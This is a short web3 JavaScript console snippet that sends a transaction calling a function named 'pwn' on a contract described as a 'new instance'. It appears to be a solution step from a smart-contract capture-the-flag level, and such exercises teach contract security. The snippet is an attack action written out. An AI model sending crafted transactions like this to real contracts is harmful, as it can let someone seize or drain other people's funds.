// run in console
const payload = web3.eth.abi.encodeFunctionSignature({
  name: "pwn",
  type: "function",
  inputs: [],
});
await web3.eth.sendTransaction({
  data: payload,
  from: process.env.WALLET_ADDRESS,
  to: "0x7AFe4EeF435526419DABAb27ac7E4924c808F3EA", // new instance
});
